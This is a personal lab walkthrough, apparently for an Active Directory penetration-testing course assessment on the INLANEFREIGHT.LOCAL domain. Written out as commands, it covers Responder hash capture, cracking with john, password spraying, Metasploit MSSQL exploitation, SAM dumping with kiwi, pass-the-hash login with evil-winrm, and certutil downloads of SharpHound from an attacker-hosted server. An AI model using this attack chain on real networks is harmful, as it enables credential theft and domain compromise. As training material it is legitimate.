# Warning
Make sure you visit the end of AD to study more boxes for the test.

IP Addresses:
172.16.7.3
172.16.7.50
172.16.7.60

# The Beginning
```bash
sudo responder -I ens224

# Found AB920:weasal
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Checking the password Policy
crackmapexec smb 172.16.7.3 -u 'AB920' -p 'weasal' --pass-pol
```

```bash
smbmap -u 'AB920' -p 'weasal' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
[+] IP: 172.16.7.3:445  Name: inlanefreight.local                               
        Disk  Permissions     Comment
        ADMIN$  NO ACCESS       Remote Admin
        C$      NO ACCESS       Default share
        Department Shares  READ ONLY       Share for department users
        IPC$               READ ONLY       Remote IPC
        NETLOGON           READ ONLY       Logon server share 
        SYSVOL             READ ONLY       Logon server share
```

![[Pasted image 20260803103700.png]]

Now 
`crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee usernames.txt`

`cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee cleanusers.txt`

or a password list
`crackmapexec smb 172.16.7.3 -u cleanusers.txt -p Welcome1 "[+]"`

Was the result
`[+] INLANEFREIGHT.LOCAL\BR086:Welcome1`

SMB sign in
`smbclient //172.16.7.3/'Department Shares' -U 'INLANEFREIGHT\\BR086'%'Welcome1'`

Inside was the web config file for the environment
Logging into the web on the other IP address
`mssqlclient.py 'netdb:D@ta_bAse_adm1n!@172.16.7.60'`
Logging in wouldn't let me get a shell with `xp_cmdshell`
So use `msfconsole` to get a shell using exploit/windows/mssql/mssql_payload

After that got a shell. Then proceeded to use `getsystem` to get a system shell.
```bash
load kiwi
lsa_dump_sam
```

That gave methe administrators hash. 
`$evil-winrm -i 172.16.7.60 -u Administrator -H '136b3ddfbb62cb02e53a8f661248f364'`

[Kali Linux / Packages / sharphound · GitLab](https://gitlab.com/kalilinux/packages/sharphound)

```python
python3 -m http.server 8080
curl -O "http://10.10.17.222:8080/SharpHound.exe"

# Parrot Download to windows
python3 -m http.server 8080
certutil -urlcache -f http://172.16.7.240:8080/SharpHound.exe SharpHound.exe
```